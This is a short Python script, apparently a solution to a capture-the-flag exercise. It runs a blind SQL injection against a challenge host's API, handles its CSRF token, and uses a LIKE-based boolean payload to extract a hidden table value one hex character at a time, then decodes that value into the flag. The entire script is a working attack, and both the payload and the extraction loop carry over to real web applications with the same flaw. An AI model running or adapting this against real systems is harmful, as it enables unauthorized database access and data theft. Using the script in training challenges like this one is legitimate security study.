import requests


class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        host = host.rstrip('/')
        self.base_url = f'{host}/api/'
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token').json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query}
        return self.sess.post(url, json=data, headers=headers, timeout=10).json()

    def blind(self, query):
        url = self.base_url + 'blind'
        response = self._do_raw_req(url, query)
        return response['result'], response.get('sql_error', '')


host = 'http://sqlinjection.challs.cyberchallenge.it'
print(f"[*] Connecting to {host} ...")
try:
    inj = Inj(host)
    print("[+] Token obtained. Starting blind SQLi extraction...")
except Exception as e:
    print(f"[-] Connection error. Check the VM network/VPN.\nDetails: {e}")
    exit(1)

payload = "1' and (select 1 from secret where HEX(asecret) LIKE '{}%')='1"
dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = payload.format(result + c)
        print(f"[*] Testing HEX string: {result + c}", end='\r')
        response, error = inj.blind(question)
        if response == 'Success':
            result += c
            print(f"\n[+] Partial HEX match: {result}")
            break
    else:
        break

print(f"\n\n[*] HEX extraction complete: {result}")

if result:
    try:
        flag = bytes.fromhex(result).decode('utf-8')
        print("=" * 50)
        print(f"[!] FLAG: {flag}")
        print("=" * 50)
    except Exception as e:
        print(f"[-] Conversion error: {e}")
else:
    print("[-] No data extracted.")